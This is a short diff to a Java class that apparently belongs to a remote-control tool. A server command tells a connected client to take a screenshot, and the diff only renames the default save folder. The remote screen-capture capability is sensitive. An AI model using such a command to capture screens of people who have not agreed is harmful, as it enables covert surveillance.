@@ -21,7 +21,7 @@ public class TakeScreenshot extends Command
 		if(this.server.currentConnection == null)
 			throw new Exception("current connection is equal to null");
 		
-		final String opath = commandLine.getOptionValue("opath", Variables.instance.workDir + "screenshots" + File.separator + "screenshot.jpg");
+		final String opath = commandLine.getOptionValue("opath", Variables.instance.workDir + "shots" + File.separator + "screenshot.jpg");
 		this.server.currentConnection.outputStream.writeObject(new S8PacketScreenshot(opath));
 	}
 }
